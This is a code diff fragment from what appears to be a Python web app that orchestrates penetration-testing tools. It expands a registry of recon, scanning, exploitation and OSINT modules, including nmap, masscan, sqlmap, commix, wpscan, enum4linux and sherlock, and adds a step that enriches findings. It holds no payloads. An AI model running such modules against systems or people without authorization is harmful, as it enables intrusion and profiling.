-    {"id":"tech",       "name":"Technology Detection",     "fn":mod_tech,       "types":["domain","url"],             "phase":"recon"},
-    {"id":"ports",      "name":"Basic Port Scan",          "fn":mod_ports_basic,"types":["domain","url","ip"],        "phase":"recon"},
-    {"id":"nmap",       "name":"NMAP Service Scan",        "fn":mod_nmap,       "types":["domain","url","ip"],        "phase":"scanning"},
-    {"id":"nikto",      "name":"Nikto Web Scanner",        "fn":mod_nikto,      "types":["domain","url"],             "phase":"scanning"},
-    {"id":"sublist3r",  "name":"Subdomain Enumeration",    "fn":mod_sublist3r,  "types":["domain","url"],             "phase":"scanning"},
-    {"id":"dirb",       "name":"Directory Brute Force",    "fn":mod_dirb,       "types":["domain","url"],             "phase":"scanning"},
-    {"id":"sqlmap",     "name":"SQL Injection Scan",       "fn":mod_sqlmap,     "types":["domain","url"],             "phase":"exploitation"},
-    {"id":"xsstrike",   "name":"XSS Scanner",              "fn":mod_xsstrike,   "types":["domain","url"],             "phase":"exploitation"},
-    {"id":"commix",     "name":"Command Injection Scan",   "fn":mod_commix,     "types":["domain","url"],             "phase":"exploitation"},
-    {"id":"sherlock",   "name":"Username OSINT",           "fn":mod_sherlock,   "types":["username"],                 "phase":"recon"},
-    {"id":"email",      "name":"Email OSINT",              "fn":mod_email,      "types":["email"],                    "phase":"recon"},
+    # ── Recon phase ──
+    {"id":"dns",          "name":"DNS & WHOIS Recon",        "fn":mod_dns,          "types":["domain","url"],             "phase":"recon"},
+    {"id":"headers",      "name":"HTTP Security Headers",    "fn":mod_headers,      "types":["domain","url"],             "phase":"recon"},
+    {"id":"ssl",          "name":"SSL/TLS Analysis",         "fn":mod_ssl,          "types":["domain","url"],             "phase":"recon"},
+    {"id":"robots",       "name":"Robots & Sitemap",         "fn":mod_robots,       "types":["domain","url"],             "phase":"recon"},
+    {"id":"tech",         "name":"Technology Detection",     "fn":mod_tech,         "types":["domain","url"],             "phase":"recon"},
+    {"id":"wafw00f",      "name":"WAF Detection",            "fn":mod_wafw00f,      "types":["domain","url"],             "phase":"recon"},
+    {"id":"ports",        "name":"Basic Port Scan",          "fn":mod_ports_basic,  "types":["domain","url","ip"],        "phase":"recon"},
+    # ── Scanning phase ──
+    {"id":"nmap",         "name":"NMAP Service Scan",        "fn":mod_nmap,         "types":["domain","url","ip"],        "phase":"scanning"},
+    {"id":"masscan",      "name":"Masscan Fast Ports",       "fn":mod_masscan,      "types":["domain","url","ip"],        "phase":"scanning"},
+    {"id":"nikto",        "name":"Nikto Web Scanner",        "fn":mod_nikto,        "types":["domain","url"],             "phase":"scanning"},
+    {"id":"sublist3r",    "name":"Subdomain Enumeration",    "fn":mod_sublist3r,    "types":["domain","url"],             "phase":"scanning"},
+    {"id":"harvester",    "name":"theHarvester OSINT",       "fn":mod_theharvester, "types":["domain","url"],             "phase":"scanning"},
+    {"id":"dirb",         "name":"Directory Brute Force",    "fn":mod_dirb,         "types":["domain","url"],             "phase":"scanning"},
+    {"id":"gobuster",     "name":"Gobuster Dir Scan",        "fn":mod_gobuster,     "types":["domain","url"],             "phase":"scanning"},
+    {"id":"wpscan",       "name":"WordPress Scanner",        "fn":mod_wpscan,       "types":["domain","url"],             "phase":"scanning"},
+    {"id":"admin_enum",   "name":"Admin & User Enumeration", "fn":mod_admin_enum,   "types":["domain","url"],             "phase":"scanning"},
+    {"id":"enum4linux",   "name":"SMB/Windows Enum",         "fn":mod_enum4linux,   "types":["domain","url","ip"],        "phase":"scanning"},
+    {"id":"dnstwist",     "name":"Typosquatting Detection",  "fn":mod_dnstwist,     "types":["domain","url"],             "phase":"scanning"},
+    # ── Exploitation phase ──
+    {"id":"sqlmap",       "name":"SQL Injection Scan",       "fn":mod_sqlmap,       "types":["domain","url"],             "phase":"exploitation"},
+    {"id":"xsstrike",     "name":"XSS Scanner",              "fn":mod_xsstrike,     "types":["domain","url"],             "phase":"exploitation"},
+    {"id":"commix",       "name":"Command Injection Scan",   "fn":mod_commix,       "types":["domain","url"],             "phase":"exploitation"},
+    # ── OSINT (non-web targets) ──
+    {"id":"sherlock",     "name":"Username OSINT",           "fn":mod_sherlock,     "types":["username"],                 "phase":"recon"},
+    {"id":"email",        "name":"Email OSINT",              "fn":mod_email,        "types":["email"],                    "phase":"recon"},
 ]
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -623,6 +1218,8 @@ def _execute(scan_id, target, target_type, modules):
             uniq.append(a)
     risk_ord = {"critical":0,"high":1,"medium":2,"low":3}
     uniq.sort(key=lambda a: risk_ord.get(a.get("risk","low"),4))
+    # Enrich attacks with context explanations
+    _enrich_attacks(uniq)
     scan["attacks"] = uniq
 
     scan["status"] = "completed"
